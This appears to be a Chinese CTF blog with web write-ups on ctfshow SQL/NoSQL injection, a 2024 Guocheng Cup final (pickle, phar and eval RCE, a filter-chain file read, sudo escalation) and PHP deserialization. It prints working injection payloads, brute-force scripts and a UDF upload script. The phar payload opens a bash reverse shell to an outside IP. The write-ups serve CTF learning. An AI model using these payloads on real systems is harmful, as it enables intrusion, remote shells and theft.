这道题floor函数也被ban掉了\n根据floor报错注入的原理，其实我们可以知道，之所以会出现错误主要是因为用floor对rand(0)*2进行取整，目的输出011011\u0026hellip;的结果，而既然这样我们只需要找一个同样能进行取整的函数来代替floor就ok了\n除了floor之外，我们还能使用round，ceil等\npayload\n查表 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\r查列 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagsa\u0026#39; limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\r查数据 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 web248 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤, UDF注入\nctfshow-web入门-sql注入-web248-UDF 注入_ctfshow web248-CSDN博客\n我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：\nMySQL \u0026lt; 5.0\t导出路径随意； 5.0 \u0026lt;= MySQL\u0026lt; 5.1\t需要导出至目标服务器的系统目录（如：c:/windows/system32/） 5.1 \u0026lt; MySQL\t必须导出到MySQL安装目录下的lib\\plugin文件夹下\n堆叠注入查版本\n/api/?id=0\u0026#39;;select version();%23 大于5.1，接着要查目录路径\n/api/?id=0\u0026#39;;select @@plugin_dir;%23 /usr/lib/mariadb/plugin 拿到路径，我们接下来就可以传入我们的恶意so文件了\nsqlmap中有已经写好的 udf 文件\n如，lib_mysqludf_sys_64.so\n但是由于get传参有长度限制，我们需要进行分段传参\n放一个国外大佬的脚本，将udf文件分段上传后再进行合并即可\nimport requests\rurl=\u0026#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/\u0026#34;\rudf=\u0026#34;\u0026#34;\rudfs=[]\rfor i in range(0,len(udf),5000):\rudfs.append(udf[i:i+5000])\r#写入多个文件中\rfor i in udfs:\rurl1=url+f\u0026#34;?id=1\u0026#39;;SELECT \u0026#39;{i}\u0026#39; into dumpfile \u0026#39;/tmp/\u0026#34;+str(udfs.index(i))+\u0026#34;.txt\u0026#39;%23\u0026#34;\rrequests.get(url1)\r#合并文件生成so文件\rurl2=url+\u0026#34;?id=1\u0026#39;;SELECT unhex(concat(load_file(\u0026#39;/tmp/0.txt\u0026#39;),load_file(\u0026#39;/tmp/1.txt\u0026#39;),load_file(\u0026#39;/tmp/2.txt\u0026#39;),load_file(\u0026#39;/tmp/3.txt\u0026#39;))) into dumpfile \u0026#39;/usr/lib/mariadb/plugin/hack.so\u0026#39;%23\u0026#34;\rrequests.get(url2)\r#创建自定义函数并执行恶意命令\rrequests.get(url+\u0026#34;?id=1\u0026#39;;create function sys_eval returns string soname \u0026#39;hack.so\u0026#39;%23\u0026#34;)\rr=requests.get(url+\u0026#34;?id=1\u0026#39;;select sys_eval(\u0026#39;cat /f*\u0026#39;)%23\u0026#34;)\rprint(r.text) web249 1sql语句 2 3 //无 4 $user = $memcache-\u0026gt;get($id); 5 6返回逻辑 7 8 //无过滤 payload:\n?id[]=flag web250 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } ctfshow-web入门-sql注入（web249-web253）nosql 注入_ctfshow web250-CSDN博客\n在这些操作符中，$ne 就是我们在重言式注入中需要利用到的那个，它的作用是将不等于指定值的数据都查询出来，比如 $ne=1 时就是将所有不等于 1 的数据都查询出来。\n所以payload就是\nusername[$ne]=1\u0026amp;password[$ne]=1 环境好像有点问题（？）前两次一直查不出来\nweb251 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 同样是\nusername[$ne]=1\u0026amp;password[$ne]=1 继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag\n可能flag在其他用户的密码里，我们禁用admin\nusername[$ne]=admin\u0026amp;password[$ne]=1 拿到flag\nweb252 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 13 这题有很多不同的username\n我们可以考虑采用正则匹配来筛选\nusername[$ne]=1\u0026amp;password[$regex]=ctfshow{ or\n用$gt （大于）一直尝试知道拿到有flag的用户\nusername[$ne]=admin\u0026amp;password[$ne]=1\rusername[$gt]=admin1\u0026amp;password[$ne]=1\rusername[$gt]=admin2\u0026amp;password[$ne]=1\rusername[$gt]=admin3\u0026amp;password[$ne]=1 or\n正则匹配去掉所有为admin开头的用户\nusername[$regex]=^[^admin].*$\u0026amp;password[$ne]=1 web253 1sql语句 2 3 //sql 4 db.ctfshow_user.find({username:\u0026#39;$username\u0026#39;,password:\u0026#39;$password\u0026#39;}).pretty() 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 方法一 CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园\n猜测到id为flag，直接布尔盲注拿到flag\nimport string\rimport requests\rurl = \u0026#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/\u0026#34;\rletters = \u0026#34;{}-_\u0026#34; + string.ascii_lowercase + string.digits\rdef valid_pass(password: str) -\u0026gt; bool:\rdata = {\r\u0026#34;username[$regex]\u0026#34;: \u0026#34;flag\u0026#34;,\r\u0026#34;password[$regex]\u0026#34;: f\u0026#34;{password}.*\u0026#34;\r}\rresponse = requests.post(url, data=data)\rreturn \u0026#34;登陆成功\u0026#34; in response.json()[\u0026#34;msg\u0026#34;]\rresult = \u0026#34;\u0026#34;\rwhile True:\rfor letter in letters:\rif valid_pass(result + letter):\rresult += letter\rprint(f\u0026#34;[*] result: {result}\u0026#34;)\rbreak 方法二 import requests, time, json\rdef brute(action, username=\u0026#34;\u0026#34;):\rurl = \u0026#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/\u0026#34;\rif action == \u0026#34;username\u0026#34;:\rres = \u0026#34;^[^a]\u0026#34; # admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户\relse:\rres = \u0026#34;^ctfshow{\u0026#34;\rfor j in range(30):\rflag = False\rfor i in range(127):\rreg = res\rif chr(i) not in \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_\u0026#34;:\rcontinue\rn = chr(i)\rif chr(i) in \u0026#34;-{}:\u0026#34;:\rn = \u0026#34;\\\\\u0026#34;+chr(i)\rprint(chr(i))\rif action == \u0026#34;username\u0026#34;:\rdata = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;, \u0026#34;password[$ne]\u0026#34;: f\u0026#34;1\u0026#34;}\relse:\rdata = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{username}$\u0026#34;, \u0026#34;password[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;}\rwhile True:\rtry:\rr = requests.post(url, data=data, timeout=7)\rbreak\rexcept TimeoutError:\rtime.sleep(0.1)\rexcept KeyboardInterrupt:\rexit(0)\rtry:\rresp = json.loads(r.text)\rexcept:\rresp = None\rcontinue\rif resp[\u0026#34;msg\u0026#34;] == \u0026#34;\\u767b\\u9646\\u6210\\u529f\u0026#34;:\rres += chr(i)\rflag = True\rbreak\rif not flag:\rbreak\rprint(res)\rreturn res\rif __name__ == \u0026#39;__main__\u0026#39;:\rusername = brute(\u0026#34;username\u0026#34;)\rprint(f\u0026#34;用户名为: {username}\u0026#34;)\rpassword = brute(\u0026#34;password\u0026#34;, username)\rprint(f\u0026#34;用户名: {username}\\n密码: {password}\u0026#34;) ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/","summary":"\u003ch4 id=\"无过滤注入对输出内容进行过滤\"\u003e\u003cstrong\u003e无过滤注入\u003c/strong\u003e（对输出内容进行过滤）\u003c/h4\u003e\n\u003ch4 id=\"web171\"\u003eweb171\u003c/h4\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e$sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eflag是存在于username为flag的用户的数据中，我们只需要通过\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1\u0026#39; or 1=1 --+\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即可输出所有用户数据\u003c/p\u003e\n\u003ch4 id=\"web172\"\u003eweb172\u003c/h4\u003e\n\u003cp\u003e相比上一题，这题增加了过滤\u003c/p\u003e","title":"CTFSHOW-SQL注入-Writeup"},{"content":"CTF mountain Python Bottle框架伪造session打pickle反序列化\n拿到题目看一下源码，有hint\n访问/display\n根据提示，尝试用photo参数读图片\n猜测应该有任意文件读取\n读一下/etc/passwd\n接下来看看能不能读源码\n先读环境变量/proc/self/cmdline，发现被waf了\n再试试直接读/proc/1/cmdline（self被waf了）\n得到源码位置，我们直接读\n/apppppp/app.py\n拿到源码\n1from bottle import Bottle, route, run, template, request, response 2from config.D0g3_GC import Mountain 3import os 4import re 5 6 7messages = [] 8 9@route(\u0026#34;/\u0026#34;) 10def home(): 11 return template(\u0026#34;index\u0026#34;) 12 13 14@route(\u0026#34;/hello\u0026#34;) 15def hello_world(): 16 try: 17 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=Mountain) 18 if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: 19 session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} 20 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=Mountain) 21 return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) 22 if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 23 return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) 24 except: 25 return \u0026#34;hacker!!! I\u0026#39;ve caught you\u0026#34; 26 27 28@route(\u0026#34;/display\u0026#34;) 29def get_image(): 30 photo = request.query.get(\u0026#39;photo\u0026#39;) 31 if photo is None: 32 return template(\u0026#39;display\u0026#39;) 33 if re.search(\u0026#34;^../|environ|self\u0026#34;, photo): 34 return \u0026#34;Hacker!!! I\u0026#39;ll catch you no matter what you do!!!\u0026#34; 35 requested_path = os.path.join(os.getcwd(), \u0026#34;picture\u0026#34;, photo) 36 try: 37 if photo.endswith(\u0026#39;.png\u0026#39;): 38 default_png_path = \u0026#34;/appppp/picture/\u0026#34; 39 pngrequested_path = default_png_path+photo 40 with open(pngrequested_path, \u0026#39;rb\u0026#39;) as f: 41 tfile = f.read() 42 response.content_type = \u0026#39;image/png\u0026#39; 43 else: 44 with open(requested_path) as f: 45 tfile = f.read() 46 except Exception as e: 47 return \u0026#34;you have some errors, continue to try again\u0026#34; 48 return tfile 49 50 51@route(\u0026#34;/admin\u0026#34;) 52def admin(): 53 session = request.get_cookie(\u0026#34;name\u0026#34;, secret=Mountain) 54 if session and session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: 55 return template(\u0026#34;administator\u0026#34;, messages=messages) 56 else: 57 return \u0026#34;No permission!!!!\u0026#34; 58 59 60 61 62if __name__ == \u0026#34;__main__\u0026#34;: 63 os.chdir(os.path.dirname(__file__)) 64 run(host=\u0026#34;0.0.0.0\u0026#34;, port=8089) 这里是导入的是构造cookie的key\nfrom config.D0g3_GC import Mountain key可以通过任意文件读取读到\n/appppp/config/D0g3_GC.py\n通过代码我们可以发现，哪怕我们构造出admin进入到/admin路由那我们其实也不能得到什么\n事实上这是一道pickle反序列化的题目\n我们如果跟进get_cookie方法(/admin和/hello都有)我们可以发现\n在这个get_cookie方法里面会对cookie中的数据进行pickle反序列化\n也就是说我们可以通过他就可以进行任何命令的执行\nexp\n1from bottle import route, run,response 2import os 3 4 5Mountain = \u0026#34;123\u0026#34; 6 7class exp(object): 8 def __reduce__(self): 9 return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;calc\u0026#39;).read()\u0026#34;,)) 10 11 12@route(\u0026#34;/\u0026#34;) 13def index(): 14 session = exp() 15 response.set_cookie(\u0026#34;name\u0026#34;, session, secret=Mountain) 16 return \u0026#34;success\u0026#34; 17 18 19if __name__ == \u0026#34;__main__\u0026#34;: 20 os.chdir(os.path.dirname(__file__)) 21 run(host=\u0026#34;127.0.0.1\u0026#34;, port=8081) 弹shell拿flag\n图片查看器 考点：1.信息收集 2.filterchain读文件 3.phar反序列化 4.提权\n拿到题目是一个名字输入器，但这玩意没什么用\n随便输一个名字就会进入到/trans1t.php\n我们先不急着去挑战，先看看这个页面有没有什么hint\n提示有东西在hI3t.php,但是我们没办法直接访问\n接着点来到挑战来到/chal13nge.php\n是一个图片上传，我们再查看一下源代码\n结合刚刚看到的hI3t.php，猜测大概率是要想办法读hI3t.php\n再看看这个文件上传，再上传成功后可以进行文件信息的查询，文件信息查询使用的方法很可能存在filter链的漏洞\n这里是关于oracle的文件读取漏洞\nPHP Filter链——基于oracle的文件读取攻击 - 先知社区\n自动化工具：https://github.com/synacktiv/php_filter_chains_oracle_exploit\npython filters_chain_oracle_exploit.py --target http://125.70.243.22:31345/chal13nge.php --file \u0026#39;/var/www/html/hI3t.php\u0026#39; --parameter image_path\r//--target 目标地址 --file 要读的文件地址 --parameter 要注入的参数 '\n访问/x@1.php\n我们可以看到一个后门类backdoor，通过它我们可以执行任意的命令\n那我们怎么调用这个后门类呢？\n结合刚刚的文件上传和文件信息查询，我们可以想到phar反序列化\n1\u0026lt;?php 2 3class backdoor 4{ 5 public $cmd; 6 7 function __destruct() 8 { 9 $cmd = $this-\u0026gt;cmd; 10 system($cmd); 11 } 12} 13 14$a=new backdoor(); 15$a-\u0026gt;cmd=\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/106.55.168.231/7777 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;; //弹个shell 16$phar = new Phar(\u0026#34;test.phar\u0026#34;); 17$phar-\u0026gt;startBuffering(); 18$phar-\u0026gt;setStub(\u0026#34;\u0026lt;php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); 19$phar-\u0026gt;setMetadata($a); 20$phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); 21$phar-\u0026gt;stopBuffering(); 接着我们可通过抓包修改文件后缀的方法上传我们的phar文件\n上传成功\n我们接着读phar文件\n成功弹shell\n尝试读flag发现要提权\n通过 sudo -l 可以发现有一个check.sh文件具有sudo权限\n执行check.sh会运行run.sh\n也就是说我们可以通过写一个run.sh来读flag\necho \u0026#34;cat /root/flag\u0026#34; \u0026gt; /tmp/rootscripts/run.sh\rchmod 777 /tmp/rootscripts/run.sh\rsudo /tmp/rootscripts/check.sh \u0026#34;/tmp/rootscripts\u0026#34; 拿到flag\n题外\n/chal13nge.php的源码\n1\u0026lt;?php 2error_reporting(0); 3include \u0026#34;class.php\u0026#34;; 4 5if (isset($_POST[\u0026#39;image_path\u0026#39;])) { 6 $image_path = $_POST[\u0026#39;image_path\u0026#39;]; 7 echo \u0026#34;The owner ID of the file is: \u0026#34;; 8 echo fileowner($image_path).\u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; 9 echo \u0026#34;文件信息如下：\u0026#34;. \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 10 $m = getimagesize($image_path); 11 if ($m) { 12 echo \u0026#34;宽度: \u0026#34; . $m[0] . \u0026#34; 像素\u0026lt;br\u0026gt;\u0026#34;; 13 echo \u0026#34;高度: \u0026#34; . $m[1] . \u0026#34; 像素\u0026lt;br\u0026gt;\u0026#34;; 14 echo \u0026#34;类型: \u0026#34; . $m[2] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 15 echo \u0026#34;HTML 属性: \u0026#34; . $m[3] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 16 echo \u0026#34;MIME 类型: \u0026#34; . $m[\u0026#39;mime\u0026#39;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 17 } else { 18 echo \u0026#34;无法获取图像信息，请确保文件为有效的图像格式。\u0026#34;; 19 } 20} 21 22$allowed_extensions = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;png\u0026#39;]; 23$upload_dir = __DIR__ . \u0026#39;/uploads/\u0026#39;; 24if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_FILES[\u0026#39;image\u0026#39;])) { 25 $file = $_FILES[\u0026#39;image\u0026#39;]; 26 $file_ext = strtolower(pathinfo($file[\u0026#39;name\u0026#39;], PATHINFO_EXTENSION)); 27 28 if (in_array($file_ext, $allowed_extensions)) { 29 $upload_path = $upload_dir . basename($file[\u0026#39;name\u0026#39;]); 30 31 if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $upload_path)) { 32 echo \u0026#34;上传成功！路径: \u0026#34; . \u0026#39;uploads/\u0026#39; . basename($file[\u0026#39;name\u0026#39;]); 33 } else { 34 echo \u0026#34;文件上传失败，请重试。\u0026#34;; 35 } 36 } else { 37 echo \u0026#34;不支持的文件类型，仅支持: \u0026#34; . implode(\u0026#34;, \u0026#34;, $allowed_extensions); 38 } 39} 40?\u0026gt; 41\u0026lt;!DOCTYPE html\u0026gt; 42\u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; 43\u0026lt;head\u0026gt; 44 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 45 \u0026lt;title\u0026gt;图片上传与信息获取\u0026lt;/title\u0026gt; 46\u0026lt;/head\u0026gt; 47\u0026lt;body\u0026gt; 48\u0026lt;h2\u0026gt;图片上传\u0026lt;/h2\u0026gt; 49\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 50 \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image\u0026#34; required\u0026gt; 51 \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传图片\u0026lt;/button\u0026gt; 52\u0026lt;/form\u0026gt; 53\u0026lt;h2\u0026gt;获取图片信息\u0026lt;/h2\u0026gt; 54\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; 55 \u0026lt;label for=\u0026#34;image_path\u0026#34;\u0026gt;请输入图片路径：\u0026lt;/label\u0026gt; 56 \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;image_path\u0026#34; required\u0026gt; 57 \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;获取图片信息\u0026lt;/button\u0026gt; 58\u0026lt;/form\u0026gt; 59\u0026lt;/body\u0026gt; 60\u0026lt;!--只需要从一个文件中获取到关键信息，这个文件在哪儿呢--\u0026gt; 从源码我们可以看到关于照片的信息查询使用的是getimagesize函数，而且没有对传入的参数进行过滤\n而getimagesize也是受filter链影响的函数之一\nAWDP Chemical_Plant 攻击 FeedbackService.php\n1\u0026lt;?php 2error_reporting(0); 3class FeedbackService { 4 private $db; 5 6 public function __construct($dbConnection) { 7 $this-\u0026gt;db = $dbConnection; 8 } 9 10 public function addFeedbackByUserId($user_id, $feedback) { 11 // 预处理 12 $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO feedback (userid, feedback) VALUES (?, ?)\u0026#34;); 13 $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $user_id, $feedback); 14 15 // 执行插入操作 16 if ($stmt-\u0026gt;execute()) { 17 return true; 18 } else { 19 return false; 20 } 21 } 22 23 public function getEmailById($id) { 24 // 预处理 25 $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT userid FROM feedback WHERE id = ?\u0026#34;); 26 $stmt-\u0026gt;bind_param(\u0026#34;i\u0026#34;, $id); 27 // 执行查找操作 28 if ($stmt-\u0026gt;execute()) { 29 $result = $stmt-\u0026gt;get_result(); 30 if ($result-\u0026gt;num_rows \u0026gt; 0) { 31 $row = $result-\u0026gt;fetch_assoc(); 32 $arr = stripslashes($row[\u0026#39;userid\u0026#39;]); 33 eval(\u0026#39;$arr=\u0026#39;.$arr.\u0026#39;;\u0026#39;); 34 return $arr; 35 } else { 36 return null; 37 } 38 } else { 39 return false; 40 } 41 } 42} 43 44?\u0026gt; 在FeedbackService.php的getEmailById方法中的存在eval，假如arr可控，那我们就可以进行任意命令执行\n那我们继续往上看\n$arr = stripslashes($row[\u0026#39;userid\u0026#39;]); 变量arr来源于数据库查表id返回的结果中的userid\n假如说我们可以提前在userid中写入我们要执行的命令，再通过id查询，就可以进行任意命令的执行\n写入数据库的命令我们可以在FeedbackService.php的addFeedbackByUserId方法中找到\npublic function addFeedbackByUserId($user_id, $feedback) {\r// 预处理\r$stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO feedback (userid, feedback) VALUES (?, ?)\u0026#34;);\r$stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $user_id, $feedback);\r// 执行插入操作\rif ($stmt-\u0026gt;execute()) {\rreturn true;\r} else {\rreturn false;\r}\r} 这里通过贫拼接的方式将user_id拼接到sql语句中并执行\n那我们接下就需要找到哪里调用addFeedbackByUserId方法\n在services.php里进行用户反馈内容提交时，没有进行任何过滤就调用addFeedbackByUserId方法写入\n那我们执行个whoami试试\n命令为什么要这样写呢\neval(\u0026#39;$arr=\u0026#39;.$arr.\u0026#39;;\u0026#39;); 因为命令执行的时候进行了简单的拼接\n写入数据后我们接下来就要看看怎样调用getEmailById方法进行数据库id查询\ncontroller.php\n1\u0026lt;?php 2 3// 引入类文件 4require_once \u0026#39;NewsService.php\u0026#39;; 5require_once \u0026#39;FeedbackService.php\u0026#39;; 6require_once\u0026#39;dbconnect.php\u0026#39;; 7require_once \u0026#39;news_data.php\u0026#39;; 8 9$db = new DBConnect(); 10$connection = $db-\u0026gt;getConnection(); 11$NewsService = new NewsService($news_items); 12$FeedbackService = new FeedbackService($connection); 13 14$className = isset($_GET[\u0026#39;c\u0026#39;]) ? $_GET[\u0026#39;c\u0026#39;] : null; 15$methodName = isset($_GET[\u0026#39;m\u0026#39;]) ? $_GET[\u0026#39;m\u0026#39;] : null; 16$id = isset($_GET[\u0026#39;id\u0026#39;]) ? $_GET[\u0026#39;id\u0026#39;] : null; 17 18 19if ($className \u0026amp;\u0026amp; $methodName) { 20 if ($className === \u0026#39;NewsService\u0026#39; \u0026amp;\u0026amp; method_exists($NewsService, $methodName)) 21 { 22 echo $NewsService-\u0026gt;$methodName($id); 23 } 24 elseif ($className === \u0026#39;FeedbackService\u0026#39; \u0026amp;\u0026amp; method_exists($FeedbackService, $methodName)) 25 { 26 echo $FeedbackService-\u0026gt;$methodName($id); 27 } else { 28 echo \u0026#34;无效的类或方法\u0026#34;; 29 } 30} else { 31 echo \u0026#34;缺少类或方法参数\u0026#34;; 32} 33 34 35?\u0026gt; 在controller.php里面可以通调用FeedbackService.php和NewsService.php中的方法\n$className = isset($_GET[\u0026#39;c\u0026#39;]) ? $_GET[\u0026#39;c\u0026#39;] : null;\r$methodName = isset($_GET[\u0026#39;m\u0026#39;]) ? $_GET[\u0026#39;m\u0026#39;] : null;\r$id = isset($_GET[\u0026#39;id\u0026#39;]) ? $_GET[\u0026#39;id\u0026#39;] : null; 通过get传参即可调用getEmailById方法\npayload:\nc=FeedbackService\u0026amp;m=getEmailById\u0026amp;id=0 这个id我们其实并不清楚，可以爆破或者一个个试试，反正不多\n命令成功执行，接下来只需要读flag就行了\n","permalink":"http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/","summary":"\u003ch3 id=\"ctf\"\u003eCTF\u003c/h3\u003e\n\u003ch4 id=\"mountain\"\u003emountain\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003ePython Bottle框架伪造session打pickle反序列化\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e拿到题目看一下源码，有hint\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241226140358450\" loading=\"lazy\" src=\"../assets/image-20241226140358450.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问/display\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241226140433229\" loading=\"lazy\" src=\"../assets/image-20241226140433229.png\"\u003e\u003c/p\u003e\n\u003cp\u003e根据提示，尝试用photo参数读图片\u003c/p\u003e","title":"国城杯决赛-Web-Writeup"},{"content":"PHP的魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\n1__construct()，类的构造函数 2 3__destruct()，类的析构函数 4 5__call()，在对象中调用一个不可访问方法时调用 6 7__callStatic()，用静态方式中调用一个不可访问方法时调用 8 9__get()，获得一个类的成员变量时调用 10 11__set()，设置一个类的成员变量时调用 12 13__isset()，当对不可访问属性调用isset()或empty()时调用 14 15__unset()，当对不可访问属性调用unset()时被调用。 16 17__sleep()，执行serialize()时，先会调用这个函数 18 19__wakeup()，执行unserialize()时，先会调用这个函数 20 21__toString()，类被当成字符串时的回应方法 22 23__invoke()，调用函数的方式调用一个对象时的回应方法 24 25__set_state()，调用var_export()导出类时，此静态方法会被调用。 26 27__clone()，当对象复制完成时调用 28 29__autoload()，尝试加载未定义的类 30 31__debugInfo()，打印所需调试信息 web254 1\u0026lt;?php 2 3 ?\u0026gt;\u0026#39;; 4 public $code=\u0026#39;xrntkk\u0026#39;; 5} 6 7$poc = new ctfshowvip(); 8echo urlencode(serialize($poc)); web262 字符串逃逸\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token=\u0026#39;user\u0026#39;; 22 public function __construct($f,$m,$t){ 23 $this-\u0026gt;from = $f; 24 $this-\u0026gt;msg = $m; 25 $this-\u0026gt;to = $t; 26 } 27} 28 29$f = $_GET[\u0026#39;f\u0026#39;]; 30$m = $_GET[\u0026#39;m\u0026#39;]; 31$t = $_GET[\u0026#39;t\u0026#39;]; 32 33if(isset($f) \u0026amp;\u0026amp; isset($m) \u0026amp;\u0026amp; isset($t)){ 34 $msg = new message($f,$m,$t); 35 $umsg = str_replace(\u0026#39;fuck\u0026#39;, \u0026#39;loveU\u0026#39;, serialize($msg)); 36 setcookie(\u0026#39;msg\u0026#39;,base64_encode($umsg)); 37 echo \u0026#39;Your message has been sent\u0026#39;; 38} 39 40highlight_file(__FILE__); message.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13highlight_file(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15 16class message{ 17 public $from; 18 public $msg; 19 public $to; 20 public $token=\u0026#39;user\u0026#39;; 21 public function __construct($f,$m,$t){ 22 $this-\u0026gt;from = $f; 23 $this-\u0026gt;msg = $m; 24 $this-\u0026gt;to = $t; 25 } 26} 27 28if(isset($_COOKIE[\u0026#39;msg\u0026#39;])){ 29 $msg = unserialize(base64_decode($_COOKIE[\u0026#39;msg\u0026#39;])); 30 if($msg-\u0026gt;token==\u0026#39;admin\u0026#39;){ 31 echo $flag; 32 } 33} 我们的目的就是想办法让token等于admin\n信息传输的过程中使用的序列化和反序列化，存在字符串逃逸，通过逃逸我们可以使token=admin\n之前写过我就懒得重新写了\nhttps://ctf.show/writeups/706838\n首先先生成一段序列\n1\u0026lt;?php 2class message{ 3 public $from; 4 public $msg; 5 public $to 